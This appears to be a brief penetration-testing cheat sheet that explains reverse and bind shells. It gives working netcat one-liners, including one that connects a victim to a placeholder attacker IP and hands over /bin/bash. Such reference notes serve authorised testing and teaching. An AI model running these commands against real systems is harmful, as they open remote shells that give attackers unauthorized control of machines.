# Shells

## Reverse Shell

A victim (target) connects back to the attacker (attackbox is listening). This is the most commonly used pattern.

- Attacker:

```

nc -nlvp 4444

```

- Victim:

```

nc <attacker-ip> 4444 -e /bin/bash

```

## Bind Shell

The victim opens a listening port and the attacker connects to it. Useful for external tests when the attacker's IP may vary or when port forwarding isn't available.

- Victim:

```
nc -nvlp 4444 -e /bin/bash
```

- Attacker:

```
nc <victim-ip> 4444
```
